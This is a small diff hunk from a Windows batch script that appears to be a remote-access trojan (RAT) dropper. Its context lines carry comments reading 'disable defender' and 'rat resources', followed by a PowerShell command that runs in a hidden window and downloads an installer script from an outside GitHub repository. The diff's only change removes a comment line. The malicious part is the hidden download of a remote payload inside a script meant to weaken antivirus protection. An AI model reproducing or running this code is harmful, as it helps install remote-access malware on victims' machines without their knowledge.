@@ -31,7 +31,7 @@ if '%errorlevel%' NEQ '0' (
 rem disable defender
 
 
- REM start
+ 
 REM rat resources  
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/installer.ps1 -OutFile installer.ps1"
